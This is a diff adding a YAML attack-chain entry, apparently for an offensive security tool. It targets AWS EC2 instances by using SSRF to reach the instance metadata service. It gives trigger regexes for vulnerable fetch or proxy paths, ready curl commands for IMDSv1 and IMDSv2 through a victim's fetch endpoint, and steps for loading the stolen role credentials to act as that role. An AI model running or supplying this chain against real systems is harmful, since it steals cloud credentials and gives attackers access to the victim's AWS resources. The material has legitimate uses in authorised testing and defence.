@@ -1,0 +1,46 @@
+chain_id: aws_imds_via_ssrf
+title: "AWS — pull EC2 instance credentials via SSRF to IMDSv1 / v2"
+severity: CRITICAL
+tags: [aws, cloud, ssrf, imds, credentials]
+
+trigger:
+  any_of:
+    - { kind: "aws-imds-target" }
+    - { path_pattern: "(?i)/(fetch|proxy|preview|render|callback|webhook|url=)" }
+
+description: |
+  EC2 boxes expose http://169.254.169.254/latest/meta-data/. If the
+  application has any SSRF (open redirect, server-side fetch, image
+  thumbnailing, link previews), pull the instance role credentials and
+  run as that role from your laptop.
+
+steps:
+  - id: 1
+    title: "IMDSv1 — single GET, no token"
+    command: |
+      curl -s "http://$VICTIMA/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+      # then:
+      curl -s "http://$VICTIMA/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>"
+
+  - id: 2
+    title: "IMDSv2 — needs a PUT to obtain a token first (SSRF must allow PUT)"
+    command: |
+      curl -s -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' \
+        "http://$VICTIMA/fetch?url=http://169.254.169.254/latest/api/token"
+      # Use the returned token:
+      curl -s -H 'X-aws-ec2-metadata-token: TOKEN' \
+        "http://$VICTIMA/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+
+  - id: 3
+    title: "Set the credentials in ~/.aws/credentials and act as the role"
+    command: |
+      [default]
+      aws_access_key_id     = ASIA...
+      aws_secret_access_key = ...
+      aws_session_token     = ...
+      # Then:
+      aws sts get-caller-identity
+      aws s3 ls
+
+references:
+  - https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf
